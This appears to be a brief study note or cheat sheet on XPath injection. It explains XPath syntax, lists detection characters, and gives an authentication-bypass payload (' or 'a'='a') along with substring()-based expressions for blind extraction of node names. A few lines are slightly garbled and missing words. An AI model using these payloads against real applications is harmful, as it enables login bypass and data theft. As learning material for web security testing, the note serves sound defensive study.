# XPath Injection

## Basic syntax


XPath query to look for a node user based on the inserted credentials is: Where and are input values, inserted by the user, therefore, they should be sanitized before being used. 
`//user[username/text()='' and password/text()='']`

| XPath syntax | description |
| -- | -- | 
| / | select document node eg. `/root` will select `root` element |
| // | select all nodes (that match the selection) regardless of their position in the document <br />- i.e., users//user select all user elements, no matter where they are under the users element| 
| node_name | select all nodes with name node_name <br />- i.e., users/user select all user elements that are children of users |
| @ | select attributes <br /> -i.e., /@id select all attributes that are named id |
| [element and condition] | select all nodes that match the defined <br />- i.e., user[username] select all user elements that contain at least one username element child <br />- i.e., user[username/text()='john'] select all user elements that contain the username element child text set to 'john' <br />- i.e., //user[@id='1'] select all user elements (no matter where they are in the document), with the attribute id set to 1|


## Detection

| syntax | description | 
| -- | -- |
| ' | used as string terminator |
| , | break integers |


## Injecting 

Original query
`<someNode> [username='<USERNAME>' and password='<PASSWORD>']`

using the payload  `' or 'a'= 'a' or 'a'= 'a`

Injected query
`//[username='' or 'a'='a' or 'a'= 'a' and password='']`


![[Pasted image 20211111141311.png]]


## Useful XPath statements

| Usefule exploits | description |
| -- | -- |
| `*[1]` | Returns the root node | 
| `name(*[1])` | XPath function returning the identifier of the root node (users in our example) |
| `name(/users/*[1])` | A function returning the identifier of the first child of the root node (user in our example) | 
| `/users/user[position()=1]/username` | Selects the username of the first user node (example). The user node is child of the root users node. |
| `Substring(‘label’,1,1)` | An XPath function returning the first character of the label string – ‘l’ |
| `' or substring(name(/*[1]),1,1)= 'a` | Check characters until the TRUE condition is met |